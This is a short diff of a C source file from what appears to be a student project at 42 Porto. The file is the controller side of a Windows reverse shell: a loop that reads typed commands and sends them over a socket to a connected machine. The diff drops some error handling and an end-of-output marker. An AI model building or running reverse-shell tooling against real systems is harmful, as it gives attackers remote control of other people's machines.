@@ -6,7 +6,7 @@
 /*   By: joesanto <joesanto@student.42porto.com>    +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2026/01/11 00:20:47 by joesanto          #+#    #+#             */
-/*   Updated: 2026/01/11 17:57:10 by joesanto         ###   ########.fr       */
+/*   Updated: 2026/01/11 19:07:43 by joesanto         ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -16,8 +16,6 @@
 #include <stdio.h>
 #include "windows_reverse_shell.h"
 #include "prompt_command.h"
-
-void winsock_receive_command_output(SOCKET client_fd);
 
 int	main(void)
 {
@@ -37,13 +35,7 @@ int	main(void)
 	}
 	while (prompt_command(&command, &command_len, client_ip))
 	{
-		command_len -= command[command_len - 1] == '\n';
 		bytes_sent = send(client_fd, command, command_len, 0);
-		if (bytes_sent == SOCKET_ERROR) {
-			fprintf(stderr, "Send failed: %d\n", WSAGetLastError());
-			break;
-		}
-		bytes_sent = send(client_fd, SEND_REVSHELL_EOF, SEND_REVSHELL_EOF_STRLEN, 0);
 		if (bytes_sent == SOCKET_ERROR) {
 			fprintf(stderr, "Send failed: %d\n", WSAGetLastError());
 			break;
